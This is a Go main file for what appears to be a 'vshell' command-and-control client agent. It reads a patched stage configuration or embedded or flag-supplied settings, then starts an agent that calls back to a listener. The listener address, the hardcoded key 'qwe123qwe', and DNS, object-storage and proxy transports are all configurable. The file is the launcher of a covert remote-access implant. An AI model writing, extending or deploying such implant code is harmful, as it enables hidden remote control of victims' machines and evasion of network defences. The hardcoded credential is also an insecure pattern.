package main

import (
	"context"
	"flag"
	"log"
	"os/signal"
	"strings"
	"syscall"

	"vshell/internal/agent"
	"vshell/internal/runtimecfg"
)

var (
	serverAddr  = "127.0.0.1:8084"
	vkey        = "qwe123qwe"
	verifyKey   = ""
	transport   = "tcp"
	dnsDomain   = ""
	publicDNS   = ""
	ossURL      = ""
	ossKey      = ""
	proxyURL    = ""
	stageConfig = [512]byte{'V', 'S', 'H', 'S', 'T', 'A', 'G', 'E', '0', '1'}
)

func main() {
	if embedded, err := runtimecfg.LoadExecutable(); err == nil {
		applyConfig(embedded)
	}
	if encoded := strings.TrimRight(string(stageConfig[:]), "\x00_"); encoded != "VSHSTAGE01" {
		if cfg, err := runtimecfg.Decode(strings.TrimPrefix(encoded, "VSHSTAGE01")); err == nil {
			applyConfig(cfg)
		}
	}
	var encodedConfig string
	flag.StringVar(&serverAddr, "server", serverAddr, "listener address")
	flag.StringVar(&vkey, "vkey", vkey, "listener credential")
	flag.StringVar(&verifyKey, "verify-key", verifyKey, "stable client identity")
	flag.StringVar(&encodedConfig, "config", "", "embedded client configuration")
	flag.Parse()
	if encodedConfig != "" {
		if cfg, err := runtimecfg.Decode(encodedConfig); err == nil {
			applyConfig(cfg)
		}
	}
	ctx, stop := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer stop()
	if err := agent.New(agent.Config{ServerAddr: serverAddr, Vkey: vkey, VerifyKey: verifyKey, Transport: transport, DNSDomain: dnsDomain, PublicDNS: publicDNS, OSSURL: ossURL, OSSKey: ossKey, ProxyURL: proxyURL}).Run(ctx); err != nil && ctx.Err() == nil {
		log.Fatal(err)
	}
}

func applyConfig(cfg runtimecfg.Config) {
	serverAddr = cfg.ServerAddr
	vkey = cfg.Vkey
	verifyKey = cfg.VerifyKey
	transport = cfg.Transport
	dnsDomain = cfg.DNSDomain
	publicDNS = cfg.PublicDNS
	ossURL = cfg.OSSURL
	ossKey = cfg.OSSKey
	proxyURL = cfg.ProxyURL
}
